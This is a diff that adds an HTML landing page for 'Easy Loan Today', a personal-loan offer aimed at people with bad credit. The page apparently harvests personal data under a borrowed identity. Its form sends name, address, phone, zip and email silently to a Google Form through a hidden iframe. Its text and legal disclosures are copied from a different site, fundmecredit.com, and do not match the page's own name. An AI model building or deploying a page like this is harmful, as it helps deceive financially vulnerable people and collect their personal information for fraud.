@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Easy Loan Today</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #1e5d80;
+    }
+
+    .top-bar {
+      background-color: #fff;
+      padding: 16px;
+      display: flex;
+      justify-content: flex-end;
+      align-items: center;
+      position: relative;
+      height: 60px;
+    }
+
+    .logo {
+      position: absolute;
+      left: 50%;
+      transform: translateX(-50%);
+      font-size: 28px;
+      font-weight: bold;
+      white-space: nowrap;
+    }
+
+    .logo span:first-child {
+      color: #4aa8e2;
+    }
+
+    .logo span:last-child {
+      color: #003366;
+    }
+
+    .menu-icon {
+      font-size: 26px;
+      cursor: pointer;
+      background: #333;
+      color: white;
+      padding: 6px 10px;
+      border-radius: 5px;
+      border: none;
+      z-index: 2;
+    }
+
+    .mobile-menu {
+      display: none;
+      flex-direction: column;
+      background-color: white;
+      position: absolute;
+      top: 60px;
+      right: 15px;
+      width: 180px;
+      border-radius: 6px;
+      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+      z-index: 99;
+      
+
+    }
+
+    .mobile-menu a {
+      padding: 12px 16px;
+      text-decoration: none;
+      color: #333;
+      border-bottom: 1px solid #eee;
+    }
+
+    .mobile-menu a:hover {
+      background-color: #f1f1f1;
+    }
+
+    .main-section {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      align-items: flex-start;
+      gap: 20px;
+      padding: 40px 15px;
+      background-color: #063955;
+    }
+
+    .loan-info {
+      background-color: #04324c;
+      color: white;
+      padding: 30px 25px;
+      border-radius: 12px;
+      flex: 1 1 350px;
+      max-width: 450px;
+      box-shadow: 0 6px 16px rgba(0, 0, 0, 0.3);
+    }
+
+    .loan-info h2 {
+      font-size: 24px;
+      margin-bottom: 20px;
+      line-height: 1.4;
+    }
+
+    .loan-info ul {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+
+    .loan-info li {
+      margin-bottom: 12px;
+      padding-left: 24px;
+      position: relative;
+      font-size: 16px;
+      line-height: 1.5;
+    }
+
+    .loan-info li::before {
+      content: '✔';
+      color: #00cc66;
+      position: absolute;
+      left: 0;
+      font-weight: bold;
+    }
+
+    .loan-info img {
+      margin-top: 20px;
+      max-width: 80px;
+    }
+
+    .form-container {
+      background-color: #fefefe;
+      flex: 1 1 350px;
+      max-width: 420px;
+      margin: 0;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.2);
+    }
+
+    .form-container h2 {
+      background-color: #4aa8e2;
+      color: white;
+      text-align: center;
+      padding: 12px;
+      margin: -25px -25px 25px -25px;
+      border-radius: 12px 12px 0 0;
+      font-size: 20px;
+    }
+
+    input[type="text"],
+    input[type="email"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 12px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 15px;
+    }
+
+    .form-row {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 12px;
+    }
+
+    .form-row input {
+      flex: 1 1 48%;
+    }
+
+    .checkbox {
+      font-size: 13px;
+      color: #333;
+      margin-bottom: 18px;
+      line-height: 1.5;
+    }
+
+    .checkbox a {
+      color: #007BFF;
+      text-decoration: none;
+    }
+
+    .submit-btn {
+      background-color: #4aa8e2;
+      color: white;
+      border: none;
+      padding: 14px;
+      width: 100%;
+      font-size: 16px;
+      font-weight: bold;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    .submit-btn:hover {
+      background-color: #3b90c7;
+    }
+
+    .footer {
+      text-align: center;
+      color: #00263a;
+      background-color: #f6f6f6;
+      padding: 20px;
+      font-size: 18px;
+      font-weight: bold;
+    }
+
+    @media (max-width: 768px) {
+      .main-section {
+        flex-direction: column;
+        align-items: center;
+        padding: 20px 10px;
+      }
+
+      .loan-info, .form-container {
+        max-width: 100%;
+      }
+
+      .form-row input {
+        flex: 1 1 100%;
+      }
+
+      .logo {
+        font-size: 22px;
+      }
+
+      .menu-icon {
+        font-size: 24px;
+      }
+    }
+    .info-section {
+  background-color: #f5f5f5;
+  padding: 50px 20px;
+  text-align: center;
+}
+
+.info-section h2 {
+  font-size: 28px;
+  margin-bottom: 40px;
+  color: #222;
+}
+
+.info-boxes {
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: center;
+  gap: 30px;
+  margin-bottom: 50px;
+}
+
+.info-box {
+  background: white;
+  border-radius: 10px;
+  padding: 30px 20px;
+  max-width: 300px;
+  flex: 1 1 250px;
+  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
+}
+
+.info-box img {
+  width: 60px;
+  margin-bottom: 20px;
+}
+
+.info-box h3 {
+  font-size: 18px;
+  margin-bottom: 12px;
+  color: #222;
+}
+
+.info-box p {
+  font-size: 14px;
+  color: #444;
+}
+
+.info-bottom {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 30px;
+  justify-content: center;
+  text-align: left;
+  padding: 0 20px;
+}
+
+.info-bottom .left,
+.info-bottom .right {
+  flex: 1 1 400px;
+  max-width: 600px;
+}
+
+.info-bottom h3 {
+  font-size: 20px;
+  margin-bottom: 10px;
+  color: #222;
+}
+
+.info-bottom p {
+  font-size: 15px;
+  color: #555;
+  line-height: 1.6;
+}
+.disclosure-section {
+  background-color: #0e5e8e;
+  color: white;
+  padding: 40px 20px;
+  font-size: 15px;
+  line-height: 1.7;
+}
+
+.disclosure-section a {
+  color: #d1ecf9;
+  text-decoration: underline;
+}
+
+.disclosure-content {
+  max-width: 1000px;
+  margin: 0 auto;
+}
+
+.disclosure-section strong {
+  color: #ffffff;
+}
+
+.disclosure-section p {
+  margin-bottom: 20px;
+}
+
+.disclosure-section .copyright {
+  margin-top: 40px;
+  text-align: center;
+  font-size: 14px;
+  color: #cfeeff;
+}
+
+
+  </style>
+</head>
+<body>
+
+  <div class="top-bar">
+    <div class="logo">
+      <span>Easy Loan</span> <span>Today</span>
+    </div>
+    <button class="menu-icon" onclick="toggleMenu()">☰</button>
+    <div class="mobile-menu" id="mobileMenu">
+      <a href="#">Home</a>
+      
+      <a href="#" onclick="showHowItWorks()">How It Works</a>
+      <a href="#" onclick="showPolicy()">Policy</a>
+      <a href="#" onclick="showTerms()">Terms</a>
+
+    </div>
+  </div>
+
+  <div class="main-section">
+    <div class="loan-info">
+      <h2>Apply now for a Personal<br>Loan 100% Online & Secured!</h2>
+      <ul>
+        <li>Online Portals for Personal Loans</li>
+        <li>Cash in Account Within 48 Hours</li>
+        <li>Quick Online Approval</li>
+        <li>Simple and Secure Application</li>
+        <li>100% Secure & Private</li>
+      </ul>
+      <img src="https://cdn-icons-png.flaticon.com/512/554/554857.png" alt="Person Icon" />
+    </div>
+
+    <div class="form-container">
+      <h2>Get Started Today!</h2>
+     
+        <form action="https://docs.google.com/forms/d/e/1FAIpQLSdlzG2S-19me_cYFvpKNZf7ucqb-K3JsDXW3LgvRW8p8KM1_w/formResponse" method="POST" target="hidden_iframe" onsubmit="submitted=true;">
+  <div class="form-row">
+    <input name="entry.1586295731" type="text" placeholder="First Name" required>
+    <input name="entry.1841310522" type="text" placeholder="Last Name" required>
+  </div>
+  <input name="entry.1896116028" type="text" placeholder="Address" required>
+  <div class="form-row">
+    <input name="entry.1913501757" type="text" placeholder="Home Phone" required>
+    <input name="entry.1779527637" type="text" placeholder="Zip Code" required>
+  </div>
+  <input name="entry.1514338401" type="email" placeholder="Email" required>
+
+  <button type="submit" class="submit-btn">CLICK FOR CASH</button>
+</form>
+
+<!-- This keeps submission silent (no page reload) -->
+<iframe name="hidden_iframe" style="display:none;"></iframe>
+
+     
+  
+
+
+    </div>
+  </div>
+
+  <div class="footer">
+   ✅ HASSLE FREE QUICK PROCESSING &nbsp; ✅ &nbsp;
+    SKIP DRIVING AND LONG LINES IN THE STORES
+  </div>
+
+  <script>
+    function toggleMenu() {
+      const menu = document.getElementById("mobileMenu");
+      menu.style.display = menu.style.display === "flex" ? "none" : "flex";
+    }
+
+    document.addEventListener("click", function (e) {
+      const menu = document.getElementById("mobileMenu");
+      const button = document.querySelector(".menu-icon");
+      if (!menu.contains(e.target) && !button.contains(e.target)) {
+        menu.style.display = "none";
+      }
+    });
+    function showHowItWorks() {
+  document.getElementById("howItWorksModal").style.display = "block";
+}
+
+function hideHowItWorks() {
+  document.getElementById("howItWorksModal").style.display = "none";
+}
+
+ function showPolicy() {
+  document.getElementById("privacyModal").style.display = "block";
+}
+
+function hidePolicy() {
+  document.getElementById("privacyModal").style.display = "none";
+}
+function showTerms() {
+  document.getElementById("termsModal").style.display = "block";
+}
+
+function hideTerms() {
+  document.getElementById("termsModal").style.display = "none";
+}
+
+
+  </script>
+<section class="info-section">
+  <h2>How Online Cash Loans Work</h2>
+  <div class="info-boxes">
+    <div class="info-box">
+      <img src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" alt="Secure Icon" />
+      <h3>Safe & Secure Application</h3>
+      <p>You can be sure, Your information will remain safe, Secure and Confidential.</p>
+    </div>
+    <div class="info-box">
+      <img src="https://cdn-icons-png.flaticon.com/512/1828/1828884.png" alt="Bad Credit Icon" />
+      <h3>Bad Credit OK</h3>
+      <p>You don't have to pay any fees to apply online. You can apply even if you have bad credit.</p>
+    </div>
+    <div class="info-box">
+      <img src="https://cdn-icons-png.flaticon.com/512/2645/2645897.png" alt="Get Started Icon" />
+      <h3>Get Started NOW!!</h3>
+      <p>Have your cash deposited in your account within 24 hours.</p>
+    </div>
+  </div>
+
+  <div class="info-bottom">
+    <div class="left">
+      <h3>Short on cash? Caught between paychecks?</h3>
+      <p>
+        fundmecredit.com is hands down the fastest way to obtain your money online. Fill up 2 steps quick and easy form and obtain loan up to $1000. Many cases there are no documents to fax depending on the lender that accepts your request.
+      </p>
+    </div>
+    <div class="right">
+      <h3>We Do Our Best To Find A Participating</h3>
+      <p>
+        We will place you with one of several loan providers depending on the information you submit on this website. Not all lenders can provide up to $1000. Cash transfer time may vary between lenders.
+      </p>
+    </div>
+  </div>
+</section>
+<section class="disclosure-section">
+  <div class="disclosure-content">
+    <p>
+      <strong><a href="#">Material Disclosure</a></strong>. The operator of this website is not a lender, loan broker or agent for any lender or loan broker. We are an advertising referral service to qualified participating lenders that may be able to provide amounts between $100 and $3,500. Not all lenders can provide up to $3,500 and there is no guarantee that you will be accepted by an independent, participating lender...
+      <a href="#">FAQs</a> for additional information on issues such as credit and late payment implications. These disclosures are provided to you for information purposes only and should not be considered legal advice.
+    </p>
+    <p>
+      <strong><a href="#">Exclusions</a></strong>. Residents of some states may not be eligible for some or all short-term, small-dollar loans. The states serviced by this website may change from time to time, without notice. Credit Implications...
+    </p>
+    <p>
+      <strong><a href="#">Professional Advice</a></strong>. Loans provided by independent, participating lenders in our network are designed to provide cash to you to be repaid within a short amount of time...
+    </p>
+
+    <p class="copyright">
+      © 2017 fundmecredit.com ALL Rights Reserved. 
+      <a href="#">Privacy Policy</a> | 
+      <a href="#">Terms of Service</a> | 
+      <a href="#">Unsubscribe</a>
+    </p>
+  </div>
+</section>
+<div id="howItWorksModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background-color: rgba(0,0,0,0.7); z-index:9999; overflow:auto;">
+  <div style="background:#fff; margin:50px auto; padding:30px; max-width:700px; border-radius:10px; box-shadow:0 0 20px rgba(0,0,0,0.3);">
+    <h2 style="text-align:center;">How It Works!!</h2>
+    <p>fundmecredit.com is not a lender - it does not make short term cash loans or credit decisions...</p>
+    <ul>
+      <li>18 years of age or older</li>
+      <li>U.S. Citizenship</li>
+      <li>Valid checking or savings account with direct deposit</li>
+      <li>Regular income of at least $1,000 per month</li>
+      <li>Not on active duty in the military (or related restrictions)</li>
+      <li>Review FAQs for credit and late payment info</li>
+    </ul>
+    <div style="text-align:center; margin-top:20px;">
+      <button onclick="hideHowItWorks()" style="padding:10px 20px; background:#4aa8e2; color:white; border:none; border-radius:6px;">Close</button>
+    </div>
+  </div>
+</div>
+<div id="privacyModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background-color: rgba(0,0,0,0.7); z-index:9999; overflow:auto;">
+  <div style="background:#fff; margin:50px auto; padding:30px; max-width:700px; border-radius:10px; box-shadow:0 0 20px rgba(0,0,0,0.3);">
+    <h2 style="text-align:center;">Your Privacy Rights</h2>
+    <p>fundmecredit.com (\"Company\") created this privacy policy to explain how we use personal information...</p>
+    <p>We understand that you value your privacy and the right to control how your personal information is collected and used...</p>
+    <p>This website is not intended for anyone under the age of eighteen (18)...</p>
+    <h3>1. Types of Information We Collect</h3>
+    <p>Company collects information about you by and through your access to and use of this Website...</p>
+    <div style="text-align:center; margin-top:20px;">
+      <button onclick="hidePolicy()" style="padding:10px 20px; background:#4aa8e2; color:white; border:none; border-radius:6px;">Close</button>
+    </div>
+  </div>
+</div>
+<div id="termsModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background-color: rgba(0,0,0,0.7); z-index:9999; overflow:auto;">
+  <div style="background:#fff; margin:50px auto; padding:30px; max-width:700px; border-radius:10px; box-shadow:0 0 20px rgba(0,0,0,0.3);">
+    <h2 style="text-align:center;">Terms and Conditions</h2>
+    <p><strong>Last Updated 8/15/2014;</strong></p>
+    <p>Welcome to fundmecredit.com. These Terms & Conditions of Use govern your use of this website and its services. By using this site, you agree that you are at least 18 years old and accept all terms outlined herein.</p>
+    <p><strong>Company's Services:</strong> Company is not a lender or agent, and does not make credit decisions. It connects users with third-party lenders and receives advertising compensation.</p>
+    <p>This site may not meet your specific needs. Always consult a financial professional before accepting any loan offers.</p>
+    <div style="text-align:center; margin-top:20px;">
+      <button onclick="hideTerms()" style="padding:10px 20px; background:#4aa8e2; color:white; border:none; border-radius:6px;">Close</button>
+    </div>
+  </div>
+</div>
+
+
+    
+</body>
+</html>
